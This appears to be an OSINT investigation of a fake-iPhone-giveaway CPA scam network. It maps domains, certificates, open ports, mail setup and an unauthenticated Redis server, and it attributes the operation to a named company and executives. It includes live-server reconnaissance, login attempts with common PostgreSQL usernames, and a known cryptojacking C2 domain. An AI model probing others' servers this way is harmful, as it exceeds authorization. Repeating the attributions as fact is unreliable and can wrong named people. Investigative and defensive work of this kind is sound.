# epicfunnels.net Investigation

CPA affiliate scam funnel built with Lovable AI, distributed via TikTok.

## Timeline

- **2023-12-14**: app.epicfunnels.net first archived (Wayback Machine — operation predates domain registration)
- **2024-01-11**: socios.epicfunnels.net first archived
- **2024-03-20**: epicfunnels.net first archived (had `/feed/` URL — was a blog/CMS)
- **2024-05-15**: evento.epicfunnels.net first archived
- **2024-05-22**: afiliados.epicfunnels.net first archived
- **2024-06-25**: phef6trk.com registered (affiliate tracker)
- **2024-08-13**: phef6trk.com first archived (Wayback Machine — tracker was live)
- **2024-10-18**: noodledit.com registered (asset CDN)
- **2025-04-09**: mydailysurge.com first archived
- **2025-08-26**: epicfunnels.net registered (per WHOIS — but had content since March 2024)
- **2025-08-28**: AWS EC2 server provisioned (nginx last-modified date)
- **2025-09-29**: iPhone promo image uploaded to GCS
- **2025-12-08**: explore.mydailysurge.com first archived
- **2026-01-25**: Let's Encrypt cert on mail server expired (not renewed)
- **2026-02-20**: jessica.epicfunnels.net first archived
- **2026-03-09**: jenny.epicfunnels.net first archived (now removed)
- **2026-03-15**: jessica.epicfunnels.net page last modified
- **2026-04-08**: Investigation conducted
- **2026-04-08**: Deep OSINT investigation — 12 avenues probed, 2 new domains found
- **2026-04-08**: Engagement bot network observed LIVE — multiple accounts liking investigator's old TikTok comments simultaneously
- **2026-04-09**: Operator fully identified — Moxxi Digital (NYC), founded by ex-Fluent Inc veterans. Full chain of attribution from scam page to real humans documented in [OPERATOR-INTEL.md](OPERATOR-INTEL.md)
- **2026-04-09**: Deep probe — Redis is a warzone (22 threat actors from 6 countries, FLUSHALL spam, crontab injection, Lua RCE exploits), 15 open ports (4 new: FTP, DNS, POP3, POP3S), GCS 747-object inventory confirmed, PostgreSQL requires auth, Hestia API IP-whitelisted
- **2026-04-09**: Follow-up probes — FTP requires auth (no anonymous), DNS is just a recursive resolver (no hidden zones), POP3 confirms Dovecot mail stack. Full threat actor attribution: 23 IPs across 8 countries (74% China), Baidu Cloud 6-IP botnet cluster identified. Redis malware identified as **WatchDog** cryptojacking campaign (Cado Labs 2022) — `b2f628` is a known campaign ID, `oracle.zzhreceive.top` is a known C2 domain

## Scam Flow

1. Victim gets link (TikTok/social media) to jessica.epicfunnels.net
2. Sees "You've been selected to win an iPhone 17 Pro Max!" with countdown timer
3. Fake "Recent Winners" section using 8 Unsplash stock photos as testimonials
4. Social proof toast notifications ("claimed a spot") via Sonner
5. Color variants: Cosmic Orange, Deep Blue, Silver
6. CTA: "Confirm -> Answer survey -> Claim prize"
7. Click triggers `navigator.sendBeacon("/api/continue-click")` for tracking
8. Then `window.location.href = "/api/continue"` for redirect
9. Both endpoints HTTP 302 to `https://www.phef6trk.com/FGK5P4/2Z57CD5/`
10. That's a CPA affiliate tracking link — operator gets paid per victim click-through
11. Tracker now sinkholed (10.0.0.1) — funnel is broken, infrastructure still live

## Network Map

### Domains

| Domain | Registrar | DNS | Role |
|--------|-----------|-----|------|
| **epicfunnels.net** | Sav.com (2025-08-26) | Cloudflare (cheryl/logan) | Scam landing page + email |
| **noodledit.com** | Cloudflare (2024-10-18) | Cloudflare (cass/felicity) | Asset CDN (GCS backend) |
| **mydailysurge.com** | Cloudflare (2025-03-19) | Cloudflare (cass/felicity) | Second brand (Google Cloud, currently 404) |
| **phef6trk.com** | Squarespace (2024-06-25) | Google Cloud DNS | CPA affiliate tracker (sinkholed) |
| **myamericanprizes.com** | GoDaddy (**2023-08-22**) | Cloudflare (cass/felicity) | OG sweepstakes brand, M365 email (Moxxi Media) |
| **olivimails.com** | — | — | EC2 hostname, **domain expired** |
| **rewardzinga.com** | Cloudflare (2024-04-10) | Cloudflare (cass/felicity) | Subscription scam site (BBB alternate name for Moxxi Digital) |

noodledit.com, mydailysurge.com, myamericanprizes.com, and rewardzinga.com share identical Cloudflare nameservers (cass/felicity) — same Cloudflare account. epicfunnels.net uses different CF nameservers (cheryl/logan).

### Infrastructure

**AWS EC2 (us-east-1)**: 13.220.193.170
- Reverse DNS: `ec2-13-220-193-170.compute-1.amazonaws.com`
- Internal hostname (leaked via SMTP banner): `ip-172-26-15-175.ec2.internal`
- Web: nginx default "Success!" page
- SMTP 587: OPEN
- IMAP 143: OPEN
- IMAP 993 (SSL): OPEN, `IMAP4rev1 AUTH=PLAIN AUTH=LOGIN`, banner: "Mail Delivery Agent"
- Port 25: BLOCKED (AWS default)

**Google Cloud**: mydailysurge.com (34.36.210.5), noodledit.com assets (GCS buckets)

**Cloudflare**: All domains proxied through Cloudflare

### Email Infrastructure

Roundcube 1.6.11 at webmail.epicfunnels.net:
- MX: `_dc-mx.16d4f49190c7.epicfunnels.net` -> 13.220.193.170
- SPF: `v=spf1 a mx ip4:13.220.193.170 -all` (hard fail)
- DMARC: `v=DMARC1; p=quarantine; pct=100`
- Session cookie: HttpOnly but NOT Secure
- Exposed paths (403): `/CHANGELOG.md`, `/SQL/`, `/config/`, `/logs/`

Two SSL certs:
- Mail server direct: Let's Encrypt R13, **EXPIRED Jan 25, 2026**
- Webmail via Cloudflare: Google Trust Services WE1, wildcard `*.epicfunnels.net`, valid Feb-May 2026

### Asset CDN

JS bundle references on noodledit.com:
- `b.noodledit.com/promotions/iphone17promax1000.png` (392KB PNG, EXIF stripped)
- `sassets.noodledit.com/pages/logo_mydailysurge.svg` (programmatically generated, no editor metadata)

Both served from Google Cloud Storage (identified via `x-guploader-uploadid`, `x-goog-*` headers).

### Scam Page

- Lovable AI confirmed: OG images hosted on `lovable.dev`
- Tech: Vite + React SPA + Tailwind CSS (Lovable default stack)
- JS bundle: ~350KB original, ~592KB beautified
- Brands: "GetnGoods" (meta author, @GetnGoods twitter), "MyDailySurge" (logo in assets)
- `robots: noindex, nofollow`

### explore.mydailysurge.com — The SEO Content Farm

Discovered alive at `explore.mydailysurge.com` (HTTP 200) while `mydailysurge.com` itself 404s. This is the **SEO/content marketing arm** of the operation:

- **Platform**: Webflow (site ID `68129c0789b42b5281896601`)
- **Last published**: Thu Mar 26, 2026 11:23:53 UTC
- **Google Analytics**: `G-BSTM4RV28F`
- **Google Tag Manager**: `GTM-N3JVLCTN`
- **Content categories**: Personal Finance, Travel, Home Design, Wellness
- **Stock photos**: Pexels (not Unsplash like the scam page)
- **CSS filename**: `staging-mydailysurge-v1` — still marked as staging
- **Blog CMS**: Webflow CMS with article templates, category pages, sidebar navigation

This is a **legitimate-looking lifestyle blog** designed to build domain authority and drive organic traffic. The scam funnels on epicfunnels.net are the monetization layer — the blog is the traffic funnel.

### Certificate Transparency — Full Subdomain History

CT logs reveal subdomains that **once existed** but are now NXDOMAIN, proving scale-up/scale-down operations:

**epicfunnels.net** (formerly active, now NXDOMAIN):
- `jessica.epicfunnels.net` — **still live** (the one we found)
- `jenny.epicfunnels.net` — person-named funnel #2
- `kylie.epicfunnels.net` — person-named funnel #3
- `afiliados.epicfunnels.net` — Spanish for "affiliates"
- `socio.epicfunnels.net` — Spanish for "partner"
- `socios.epicfunnels.net` — Spanish for "partners"
- `evento.epicfunnels.net` — Spanish for "event"
- `app.epicfunnels.net`, `demo.epicfunnels.net`, `link.epicfunnels.net`, `m.epicfunnels.net`, `vpn.epicfunnels.net`

The Spanish subdomains (afiliados, socio, socios, evento) suggest the operator is **Spanish-speaking** or targeting Spanish-speaking markets alongside English ones.

The person-named subdomains (jessica, jenny, kylie) confirm the TikTok distribution model — each name is a personalized funnel ("Jessica said I could win!").

**mydailysurge.com** CT history:
- Numbered subdomains `1.` through `31.` — **daily rotating landing pages** (all 404 now)
- `explore.` — Webflow content blog (still live)
- `signup.` — registration page (404)
- `trck.` — tracking subdomain (404)

### EC2 Server — More Than Mail

Full port scan of 13.220.193.170 reveals additional services:

| Port | Service | Status | Notes |
|------|---------|--------|-------|
| 21 | **FTP** | OPEN | **Discovered via deep probe** |
| 22 | SSH | OPEN | OpenSSH 9.2p1, ECDSA + ED25519 host keys captured |
| 25 | SMTP | BLOCKED | AWS default |
| 53 | **DNS** | OPEN | **Discovered via deep probe — running a nameserver** |
| 80 | HTTP | OPEN | nginx "Success!" page, TRACE method enabled |
| 110 | **POP3** | OPEN | **Discovered via deep probe** |
| 143 | IMAP | OPEN | Dovecot |
| 443 | HTTPS | OPEN | Redirects to HTTP (expired cert) |
| 465 | SMTPS | OPEN | Exim, TLS |
| 587 | SMTP Submission | OPEN | Banner: `ip-172-26-15-175.ec2.internal` |
| 993 | IMAPS | OPEN | `AUTH=PLAIN AUTH=LOGIN` |
| 995 | **POP3S** | OPEN | **Discovered via deep probe** |
| 3000 | **Node.js app** | OPEN | **HTTP 500** — crashed. /src/, /dist/, /node_modules/ return 308 (dirs exist) |
| 5432 | **PostgreSQL** | OPEN | Exposed to internet, **requires password** (fe_sendauth) |

**Port 3000** is a crashed Node.js application — likely the backend that handles `/api/continue-click` and `/api/continue` redirects (fronted by Cloudflare Workers or Pages).

**Port 5432** is a PostgreSQL database **listening on the public internet** — but unlike Redis, it at least requires a password. Deep probe confirmed `fe_sendauth: no password supplied` for all common users (postgres, admin, root, hestiacp). The data behind it remains unknown.

### Asset CDN — Multiple Scam Variants

The noodledit.com GCS buckets contain assets for **multiple scam campaigns**:

- `b.noodledit.com/promotions/iphone17promax1000.png` — iPhone 17 Pro Max (current campaign)
- `b.noodledit.com/promotions/macbook1000.png` — **MacBook variant** (204KB, same 720px format)
- 3 iPhone color variant WebP images on jessica.epicfunnels.net itself (Cosmic Orange 558KB, Deep Blue 477KB, Silver 394KB)

The `1000` suffix in filenames likely refers to the "$1000" prize value used in the scam copy.

## The Full Operation Model

This is a **multi-layer CPA affiliate scam operation**:

```
Layer 1: SEO CONTENT FARM
  explore.mydailysurge.com (Webflow blog)
  Categories: Personal Finance, Travel, Home Design, Wellness
  Purpose: Build domain authority, drive organic traffic
  Analytics: G-BSTM4RV28F / GTM-N3JVLCTN

Layer 2: SCAM FUNNELS
  {jessica,jenny,kylie,...}.epicfunnels.net (Lovable AI)
  "You've been selected to win an iPhone 17 Pro Max!"
  Personalized by name for TikTok/social media distribution
  Also had MacBook variant ready

Layer 3: MONETIZATION
  phef6trk.com (CPA affiliate tracker, now sinkholed)
  Operator gets paid per victim click-through

Layer 4: INFRASTRUCTURE
  AWS EC2 ── mail (Roundcube + Dovecot) + Node.js API + PostgreSQL
  Google Cloud ── mydailysurge hosting + GCS asset buckets
  Cloudflare ── DNS proxy, SSL, possibly Workers for API routing
  Webflow ── SEO content blog
  Lovable AI ── scam page generation

Layer 5: EMAIL
  epicfunnels.net ── full email infra (SPF + DMARC + Roundcube)
  Likely used for spam distribution or affiliate communications
  Spanish affiliate portal subdomains (afiliados, socio, socios)
```

### Operator Profile

- **Entity**: **Moxxi Digital** (d/b/a Moxxi Media, d/b/a Reward Zinga) — 85 Broad St NYC (WeWork), 36 employees
- **M365 tenant**: moxximedia.onmicrosoft.com — confirmed linked to Moxxi Digital
- **BBB address**: 68 White St #7-291, Red Bank, NJ (UPS Store #3488) — Morris Laniado's home turf
- **Leadership**: Morris Laniado (President), Kevin Riehl (CPO), Jeffrey Kauffman (GC), Carl Augustin (VP) — **all ex-Fluent Inc**
- **Corporate ancestor**: Fluent, Inc. (NASDAQ: FLNT) — FTC consent farm settlement ($2.5M, 620M+ leads), NY AG ($3.7M), PA AG ($250K)
- **Platform**: **CustomerTestConnect** (Express.js + Handlebars) — the backend that powers myamericanprizes.com
- **Brands**: 15+ including GetnGoods, MyDailySurge, PrizeZappy, SnagNGoods, PlayZoodle, HealthPlanScouts, Fresh Health Plan, LendliV2, Prismique, BenefitsAccessCenter, OPG Housing, Reward Zinga, and more
- **Verticals**: Gift card sweepstakes, electronics, vehicles, luxury goods, gas rewards, government benefits fraud (food stamps, stimulus, rental assistance), health insurance lead gen, lending, subscription traps
- **Tools**: Lovable AI (scam generation), Webflow (SEO blog), standard DevOps (nginx, Dovecot, PostgreSQL, Node.js, Redis, Google Cloud, Docker, Kubernetes)
- **Scale**: 747+ assets across 2 GCS buckets, 15+ brand names, daily rotating subdomains (1-31), multiple product variants — this is an **industrial-scale CPA lead generation factory**
- **OpSec**: EXIF stripped, `noindex/nofollow`, Cloudflare proxied — but leaked internal hostname via SMTP, exposed PostgreSQL to internet, exposed Redis with no auth (now contains cryptojacking malware from a third party), publicly listable GCS buckets, expired SSL cert not renewed, olivimails.com domain expired
- **Full operator attribution**: See [OPERATOR-INTEL.md](OPERATOR-INTEL.md) for the complete chain from scam page to real humans

## Conclusion

What started as a funny TikTok scam link turned out to be an industrial-scale CPA lead generation operation run by **Moxxi Digital** (NYC, d/b/a Moxxi Media, d/b/a Reward Zinga), active since at least August 2023, spanning 10 connected domains, 15+ brand names, and 8+ scam verticals. The company was founded by veterans of Fluent, Inc. — a publicly traded company the FTC sued in July 2023 for the exact same scam (consent farm lead generation using fake sweepstakes). They took the playbook, the vendor relationships (Jornaya/ActiveProspect), and the compliance expertise, and rebuilt it as a private company. The flagship brand "MyAmericanPrizes" echoes Fluent's subsidiary "American Prize Center LLC." See [OPERATOR-INTEL.md](OPERATOR-INTEL.md) for the complete attribution chain.

The operation uses Lovable AI (scored 1.8/10 in Guardio Labs' VibeScamming research — the most exploitable tool tested) to generate scam funnel pages, Webflow for SEO content farming, Google Cloud Storage for a 747-asset promotional library, AWS EC2 for email and backend services, and Cloudflare for DNS proxy and SSL. It maintains professionally assembled legal cover — ActiveProspect TCPA consent, Jornaya lead intelligence, AMOE sweepstakes compliance — to legitimize the sale of harvested personal data.

The operation targets two categories of victim. The first is the TikTok user lured by fake iPhone giveaways, gift card prizes, and luxury goods. The second is the person in financial distress — searching for food stamps, unemployment benefits, rental assistance, student aid, or stimulus checks — who lands on a page designed to impersonate a government benefit portal. Both categories end the same way: personal data harvested, sold as CPA leads, victim receives nothing.

The operator's infrastructure is simultaneously overbuilt and falling apart. They have 15 open ports on a single EC2 instance including a passwordless Redis that has become an active warzone — 24 unique attacker IPs from 6 countries, 218,219 connections, 337 FLUSHALL database wipes, crontab injection attempts, Lua RCE exploits, and replication hijack attacks, all in 75 days of uptime. The 4 cryptojacking malware payloads in the Redis keys are just one of many botnets that have passed through. PostgreSQL is at least password-protected, but exposed to the internet. The admin panel is visible to the entire world. Their CPA tracker has been sinkholed. Their Node.js backend has crashed. Their email domain has expired. Their engagement bot network on TikTok continues to farm clicks into a dead endpoint. Yet they uploaded new promotional assets as recently as today, renewed an SSL certificate 4 days ago, and published new Webflow content last week. The machine keeps running. The gears keep turning. The monetization goes nowhere.

The complete infrastructure — from the DKIM selectors that reveal the M365 tenant name, to the publicly listable GCS bucket containing 70 government benefits scam assets, to the Redis keys containing someone else's failed cryptojacking attempt — is documented in full below and in the accompanying artifacts.

## Artifacts Captured (2026-04-08)

All saved in [artifacts/](artifacts/) before infrastructure goes down:

- [x] `jessica-page.html` — raw HTML snapshot (1.4KB, Vite SPA shell)
- [x] `index-CUlwK__p.js` — JS bundle (349KB)
- [x] `index-CUlwK__p.pretty.js` — beautified JS (591KB)
- [x] `index-D8N5ZY6U.css` — CSS bundle (65KB)
- [x] `iphone17promax1000.png` — promo image from b.noodledit.com (392KB)
- [x] `logo_mydailysurge.svg` — brand logo from sassets.noodledit.com (11KB)
- [x] `ssl-cert-direct.pem` — Let's Encrypt R13 cert from mail server (expired Jan 25, 2026)
- [x] `ssl-cert-cloudflare.pem` — Google Trust WE1 wildcard cert via Cloudflare (valid through May 20, 2026)
- [x] `dns-records.txt` — full dig output for all domains (MX, TXT/SPF, DMARC, NS, A, PTR)
- [x] `favicon.ico` — site favicon (20KB)
- [x] `macbook1000.png` — MacBook variant promo image from b.noodledit.com (204KB)
- [x] `iphone-cosmicorange-prqXxnzj.webp` — iPhone Cosmic Orange variant (558KB)
- [x] `iphone-deepblue-UwoIw3eQ.webp` — iPhone Deep Blue variant (477KB)
- [x] `iphone-silver-JpOn6eFE.webp` — iPhone Silver variant (394KB)
- [x] `explore-mydailysurge.html` — full Webflow SEO blog snapshot (61KB)
- [x] `lovable-og-image.png` — Lovable AI OG image used by scam page (258KB)
- [x] `ct-logs.txt` — certificate transparency logs for all 4 domains (31KB)
- [ ] Screenshots (headless browser capture) — TODO, needs headless Chrome/Playwright

## Follow-up Investigation (2026-04-08)

Containerized re-investigation confirmed the write-up findings and revealed changes:

### What's Still Live
- jessica.epicfunnels.net serving the scam page (HTML + JS + CSS)
- Both API endpoints (`/api/continue-click`, `/api/continue`) still 302 → `phef6trk.com/FGK5P4/2Z57CD5/`
- noodledit.com asset CDN (b. and sassets. subdomains) still serving promo image + logo
- Email infrastructure: SMTP 587, IMAP 143, IMAP 993 all responding on 13.220.193.170
- SMTP banner still leaking internal hostname: `ip-172-26-15-175.ec2.internal`
- Roundcube paths `/CHANGELOG.md`, `/SQL/`, `/config/`, `/logs/` still return 403

### What Changed
- **phef6trk.com**: still sinkholed at `10.0.0.1` across all major resolvers (Google, Cloudflare, Quad9). Whois now returns empty — registrar may have scrubbed records
- **mydailysurge.com**: now returning 404 via Google Frontend — second brand appears abandoned
- **Roundcube version string**: no longer visible on login page (may have been patched or page changed)
- **noodledit.com main page**: returns empty response (no content served at root)
- **Direct SSL cert**: still expired (Jan 25, 2026), Cloudflare auto-renewed wildcard masking it

## Reinvestigation #2 (2026-04-09)

Full 8-probe containerized reinvestigation. All raw data in `artifacts/reinvestigation-2026-04-08/`.

### New Discoveries

- **Redis (port 6379) NOW OPEN** on EC2 server (13.220.193.170) — not present in any previous scan. Exposed to public internet. Likely added as caching or session store layer.
- **DKIM record found**: `mail._domainkey.epicfunnels.net` has `v=DKIM1; k=rsa; p=DKIM-SUPPORT-IS-NOT-ACTIVATED` — DNS configured but DKIM was never completed. RSA key is a placeholder.
- **epicfunnels.net root domain** now resolves to Cloudflare IPs (104.21.11.211, 172.67.192.166) and serves HTTP 200

### Infrastructure Changes

| What | Before (2026-04-08) | Now (2026-04-09) | Interpretation |
|------|---------------------|-------------------|----------------|
| jenny.epicfunnels.net | Resolves (live) | NXDOMAIN | Funnel removed |
| kylie.epicfunnels.net | Resolves (live) | NXDOMAIN | Funnel removed |
| www.epicfunnels.net | NXDOMAIN | Resolves (HTTP 200) | Activated |
| epicfunnels.net root | Behind CF proxy | HTTP 200 via CF | Now serving content |
| EC2 port 6379 (Redis) | Not seen | OPEN | New service added |
| explore.mydailysurge.com proxy | Google Frontend | Cloudflare | CDN/proxy switched |
| explore.mydailysurge.com Last-Modified | Mar 26, 2026 | **Apr 5, 2026** | Content updated 3 days ago |
| Roundcube exposed paths | HTTP 403 | HTTP 301 | HTTPS redirect reconfigured |
| phef6trk.com NS records | Google Cloud DNS | EMPTY | Completely scrubbed |
| phef6trk.com whois | Squarespace registrar | EMPTY | Registrar scrubbed all records |

### What's Still the Same

- jessica.epicfunnels.net still serving the scam page (same JS bundle `index-CUlwK__p.js`, same CSS)
- `/api/continue` and `/api/continue-click` still HTTP 302 → `phef6trk.com/FGK5P4/2Z57CD5/` (broken — tracker sinkholed)
- noodledit.com CDN (b. and sassets. subdomains) still serving all assets (iPhone, MacBook, logo)
- SMTP 587 still leaking `ip-172-26-15-175.ec2.internal`
- PostgreSQL 5432 still exposed to internet
- Node.js 3000 still HTTP 500 (crashed)
- Direct SSL cert still expired (Jan 25, 2026)
- Cloudflare wildcard cert still valid through May 20, 2026
- phef6trk.com still sinkholed at 10.0.0.1 across all 3 resolvers
- Lovable AI OG image still accessible at lovable.dev
- explore.mydailysurge.com Webflow site ID, GA, GTM all unchanged
- mydailysurge.com root still 404 via Google Frontend

### Operator Behavior Analysis

The operator is **actively maintaining infrastructure** despite the broken monetization:

1. **Consolidating funnels**: Removed jenny and kylie subdomains, keeping only jessica. Possibly rotating to a single active funnel or preparing to redeploy under new names.
2. **Activating root domain**: www.epicfunnels.net and epicfunnels.net root now serve HTTP 200 — possibly building a new landing page or redirector.
3. **Adding infrastructure**: Redis on port 6379 suggests active development — adding caching, rate limiting, or session management.
4. **Updating content farm**: explore.mydailysurge.com was updated April 5 (3 days before this probe) and migrated from Google Frontend to Cloudflare. Still investing in SEO.
5. **NOT fixing the tracker**: /api/continue still points to sinkholed phef6trk.com. Either doesn't know it's sinkholed, or is preparing a new tracker and hasn't switched yet.
6. **Reconfiguring Roundcube**: Paths changed from 403 to 301, suggesting HTTPS redirect policy was updated.

### Graph Data

Network graph JSON with all entities and connections: `graph/network-graph.json`
- **69 nodes**: 5 domains, 21 subdomains, 11 IPs, 11 services, 5 platforms, 2 brands, 5 certs, 4 email configs, 4 assets, 1 tracker, 3 verifications
- **79 edges**: resolves_to, hosts, serves, redirects_to, shared_cloudflare_account, uses_platform, has_certificate, has_email_config, backed_by, hosts_assets_for, same_operator, child_of, virtual_host_on, configured_for, has_verification
- Compatible with D3.js, Cytoscape.js, Sigma.js for visualization

## Deep Capture (2026-04-09 02:35-02:41 UTC)

6 parallel containerized probes + JS bundle analysis + olivimails.com follow-up. All raw data in `artifacts/deep-capture-2026-04-09/`.

### CRITICAL: 5th Domain — olivimails.com

SMTP STARTTLS and IMAPS certificates on 13.220.193.170 reveal a **self-signed cert** not seen through Cloudflare:

```
Subject: CN = fqdn.olivimails.com
Issuer:  O = Hestia Control Panel, L = San Francisco, ST = California, C = US
Created: Aug 28, 2025 09:24:26 (same day as server provisioning)
```

**olivimails.com** is the **original server hostname** before epicfunnels.net was added. No public DNS, no CT logs — a "shadow domain" only visible via direct server connection. The EC2 nginx has virtual hosts for both `olivimails.com` (serves "Success!" default) and `fqdn.olivimails.com` (serves "Coming Soon" page with domain name in footer).

### CRITICAL: Hestia Control Panel on Port 8083

`https://13.220.193.170:8083/` serves the **Hestia Control Panel v1.9.4** login page — the admin interface that manages the entire server (nginx, Dovecot, PostgreSQL, Node.js, Redis). Login title: "LOGIN - fqdn.olivimails.com - Hestia Control Panel". Session cookie HESTIASID uses HttpOnly + Secure + SameSite=Strict.

### CRITICAL: Redis 7.4.7 — COMPLETELY OPEN

Port 6379 `INFO` dump reveals:
- **No authentication**: `requirepass` is empty, `protected-mode: no`
- **Bound to all interfaces**: `bind: * -::*`
- **Uptime**: 75 days (~January 24, 2026)
- **Running in Docker**: PID 1, executable `/data/redis-server`
- **OS**: Linux 6.1.0-42-cloud-amd64 (Debian cloud kernel)
- **Database**: 4 keys in db0, 2.56MB used, 3.78GB total system memory
- **500 cached Lua scripts** — indicates active programmatic use

### TXT Record Intelligence

Three verification records on epicfunnels.net reveal third-party service integrations:

| Record | Service | Significance |
|--------|---------|-------------|
| `google-site-verification=qWPTL9H_t4lE4Lja7ZwdNCdmGBQEaTmtJiX7KpXbkxM` | Google Search Console | Operator has GSC access (identity clue) |
| `MS=ms66511106` | Microsoft 365 | Domain verified for M365/Azure AD |
| `activeprospect-domain-verification=M+mUYgTDEprxDUAdcdobLA==` | ActiveProspect | TCPA consent/lead verification — confirms CPA lead gen |

**Two conflicting SPF records** (invalid per RFC 7208):
1. `v=spf1 a mx ip4:13.220.193.170 -all` (mail server)
2. `v=spf1 include:spf.protection.outlook.com include:mail.zendesk.com -all` (M365 + Zendesk)

### epicfunnels.net Root Domain — Now Serving Scam Page

epicfunnels.net and www.epicfunnels.net now serve the **exact same scam page** as jessica.epicfunnels.net — same HTML, same JS bundle (`index-CUlwK__p.js`), same "Free iPhone 17 Pro Max" title, same GetnGoods branding. Previously these were NXDOMAIN.

**robots.txt** explicitly allows Googlebot, Bingbot, Twitterbot, and facebookexternalhit — contradicting the `noindex, nofollow` meta tags. Purpose: enable social media preview cards while blocking search indexing.

### SMTP Capabilities (EHLO)

```
250-SIZE 52428800        (50MB message size limit)
250-8BITMIME
250-PIPELINING
250-PIPECONNECT
250-CHUNKING
250-STARTTLS
250 HELP
```

EHLO response includes our IP in the greeting: `Hello [our-ip]` — no relay restrictions tested.

### Roundcube Details

- **Version confirmed**: rcversion 10611 (1.6.11)
- **Install date**: Asset timestamp `?s=1755356738` = Aug 16, 2025
- **cookie_secure: false** — cookies sent over HTTP
- **session_lifetime: 600** (10 minutes)
- **CSRF token present** per-session

### Virtual Host Map (nginx on EC2 :80)

| Host header | Response | Content |
|------------|----------|---------|
| olivimails.com | 200, 2520 bytes | "Success!" default |
| fqdn.olivimails.com | 200, 2499 bytes | "Coming Soon" construction page |
| epicfunnels.net | 200, 472 bytes | Smaller page (different content!) |
| jessica.epicfunnels.net | 200, 2520 bytes | "Success!" default |
| noodledit.com | 200, 2520 bytes | "Success!" default |
| mydailysurge.com | 200, 2520 bytes | "Success!" default |
| phef6trk.com | 200, 2520 bytes | "Success!" default |
| webmail.epicfunnels.net | 200, no length | Roundcube redirect |
| mail.epicfunnels.net | 200, no length | Roundcube redirect |

### Additional Findings

- **SSH**: OpenSSH 9.2p1 (Debian Bookworm)
- **IPv6**: `2606:4700:3031::ac43:c0a6`, `2606:4700:3033::6815:bd3` (Cloudflare)
- **Node.js :3000**: Every endpoint returns 500 — app is completely dead. Cloudflare Workers handles /api/continue redirects.
- **nginx /server-status**: 403 (mod_status exists but blocked)
- **/.env on epicfunnels.net**: 403 (blocked but file exists)
- **iphone17promax.png** (no "1000" suffix): 427KB, different from iphone17promax1000.png (392KB) — higher res variant
- **8 Unsplash stock photos** used as fake testimonial faces (IDs extracted from JS bundle)
- **crt.sh history**: epicfunnels.net subdomains date back to June 2025 (earlier than Aug 2025 registration — domain was transferred). mydailysurge.com first cert July 21, 2025 (Cloudflare TLS).
- **Sectigo certs** appeared for mydailysurge.com Dec 2025 / Feb 2026 — a third CA alongside Let's Encrypt and Google Trust Services

### Updated Infrastructure Diagram

```
┌─ MANAGEMENT LAYER ──────────────────────────────────────────────┐
│  Hestia Control Panel v1.9.4 (:8083)                            │
│  FQDN: fqdn.olivimails.com                                      │
│  Manages: nginx, Dovecot, PostgreSQL, Node.js, Redis             │
│  Login page exposed, API IP-whitelisted                          │
└─────────────────────────────────────────────────────────────────┘
     │
     ▼
┌─ AWS EC2 (13.220.193.170) — 15 OPEN PORTS ────────────────────┐
│  :21  FTP (deep probe discovery)                                 │
│  :22  SSH (OpenSSH 9.2p1)                                        │
│  :53  DNS (deep probe discovery — running nameserver)            │
│  :80  nginx ("Success!" + virtual hosts, TRACE enabled)          │
│  :110 POP3 (deep probe discovery — Dovecot)                      │
│  :143 IMAP (Dovecot)                                             │
│  :443 HTTPS (cert expired Jan 2026)                              │
│  :465 SMTPS (Exim, leaks internal hostname)                      │
│  :587 SMTP Submission (leaks ip-172-26-15-175.ec2.internal)      │
│  :993 IMAPS (Dovecot, AUTH=PLAIN, cert=fqdn.olivimails.com)     │
│  :995 POP3S (deep probe discovery — Dovecot over SSL)            │
│  :3000 Node.js (DEAD — HTTP 500, dirs leak via 308)              │
│  :5432 PostgreSQL (EXPOSED, requires password)                   │
│  :6379 Redis 7.4.7 (NO AUTH — WARZONE, 24 attacker IPs)         │
│  :8083 Hestia Control Panel (login exposed, API whitelisted)     │
└─────────────────────────────────────────────────────────────────┘
     │
     ▼
┌─ DOMAINS (9+) ─────────────────────────────────────────────────┐
│  olivimails.com ──── original server hostname (EXPIRED)          │
│  epicfunnels.net ─── scam funnels + email (CF: cheryl/logan)     │
│  noodledit.com ───── asset CDN on GCS (CF: cass/felicity)        │
│  mydailysurge.com ── SEO content farm (CF: cass/felicity)        │
│  phef6trk.com ────── CPA tracker (SINKHOLED at 10.0.0.1)        │
│  myamericanprizes.com ─ sweepstakes brand (M365, ActiveProspect) │
│  rewardzinga.com ──── subscription scam (BBB d/b/a)             │
│  + snagalot.com, myamericanprizes1.com, easyscanamoe.com        │
└─────────────────────────────────────────────────────────────────┘
     │
     ▼
┌─ THIRD-PARTY INTEGRATIONS ──────────────────────────────────────┐
│  Google Search Console ── domain verified                        │
│  Microsoft 365 ────────── MS=ms66511106 (deleted) + ms46839871   │
│  ActiveProspect ───────── TCPA consent verification              │
│  Jornaya (=ActiveProspect) ── lead intelligence / TCPA consent   │
│  SCA Promotions ───────── AMOE sweepstakes wrapper               │
│  Zendesk ──────────────── customer "support"                     │
│  Lovable AI ───────────── scam page generator                    │
│  Webflow ──────────────── SEO blog host                          │
│  Ve Global ────────────── retargeting platform (in GTM)          │
└─────────────────────────────────────────────────────────────────┘
```

---

## Deep OSINT Investigation (2026-04-08)

12 new avenues probed. Results in `artifacts/deep-osint-2026-04-08/`.

### New Domains Discovered

**myamericanprizes.com** — Linked from mydailysurge.com's privacy policy and do-not-sell page. This is the **6th connected domain**. The privacy policy references both `myamericanprizes.com/terms-and-conditions` and `myamericanprizes.com/do-not-sell`, confirming it's operated by the same entity.

**easyscanamoe.com** — Alternative Means of Entry (AMOE) sweepstakes system. The terms of use page links to `easyscanamoe.com/easyscan/default/enter?amoe_key=4j8lbrw52v`. AMOE systems are required by US sweepstakes law to provide a free entry method — this confirms the operation presents itself as a legitimate sweepstakes while actually running CPA lead generation.

### Wayback Machine: The Operation Is Older Than We Thought

Internet Archive snapshots reveal the infrastructure predates the apparent registration dates:

| Domain/Subdomain | Snapshots | First Archive | Key Finding |
|---|---|---|---|
| epicfunnels.net | 12 | **March 2024** | Had a `/feed/` URL (blog/CMS) |
| app.epicfunnels.net | 22 | **December 2023** | Active 20 months before "registration" |
| evento.epicfunnels.net | 22 | May 2024 | Spanish event pages |
| afiliados.epicfunnels.net | 16 | May 2024 | Spanish affiliate pages |
| socios.epicfunnels.net | 1 | January 2024 | Spanish partner page |
| phef6trk.com | 19 | August 2024 | Multi-campaign tracker |
| mydailysurge.com | 11 | April 2025 | Sweepstakes URLs found |
| jessica.epicfunnels.net | 3 | February 2026 | Recent scam funnel |
| jenny.epicfunnels.net | 4 | March 2026 | Recently created, now removed |
| explore.mydailysurge.com | 26 | December 2025 | SEO blog |
| noodledit.com | 0 | — | Never archived |
| olivimails.com | 0 | — | Never archived |

